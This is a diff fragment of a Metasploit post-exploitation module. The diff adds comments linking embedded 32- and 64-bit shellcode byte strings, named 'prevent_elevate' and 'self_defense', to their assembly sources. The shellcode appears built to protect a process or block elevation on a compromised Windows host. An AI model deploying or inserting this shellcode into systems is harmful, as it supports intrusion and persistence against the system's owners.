@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Post
     block_api_64 << "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a"
     block_api_64 << "\x48\x8b\x12\xe9\x4f\xff\xff\xff"
 
-
+    # https://github.com/EgeBalci/SelfDefense/blob/master/x86/PreventElevation/prevent_elevation.asm
     prevent_elevate_32 = ""
     prevent_elevate_32 << "\xfc\xe8\xb6\x00\x00\x00\x5b\xe8\x2f\x00\x00\x00"
     prevent_elevate_32 << "\x89\xc6\x68\x10\xe1\x8a\xc3\xe8\x23\x00\x00\x00"
@@ -102,6 +102,7 @@ class MetasploitModule < Msf::Post
     prevent_elevate_32 << "\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05"
     prevent_elevate_32 << "\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
 
+    # https://github.com/EgeBalci/SelfDefense/blob/master/x64/PreventElevation/prevent_elevation.asm
     prevent_elevate_64 = ""
     prevent_elevate_64 << "\xfc\xe8\x16\x01\x00\x00\x5b\xe8\x49\x00\x00\x00"
     prevent_elevate_64 << "\x48\x83\xc4\x20\x48\x89\xc6\x41\xba\x10\xe1\x8a"
@@ -135,6 +136,7 @@ class MetasploitModule < Msf::Post
     prevent_elevate_64 << "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
     prevent_elevate_64 << "\x59\x41\x89\xda\xff\xd5"
 
+    # https://github.com/EgeBalci/SelfDefense/blob/master/x64/self_defense.asm
     self_defense_64 = ""
     self_defense_64 << "\xfc\xe8\xc8\x00\x00\x00"
     self_defense_64 << block_api_64
@@ -161,6 +163,7 @@ class MetasploitModule < Msf::Post
     self_defense_64 << "\x58\xb9\xb7\x01\x00\x00\xc6\x00\x00\x48\xff\xc8"
     self_defense_64 << "\xe2\xf8\x6a\x00\xff\xd5"
     
+    # https://github.com/EgeBalci/SelfDefense/blob/master/x86/self_defense.asm
     self_defense_32= ""
     self_defense_32 << "\xfc\xe8\x82\x00\x00\x00"
     self_defense_32 << block_api_32
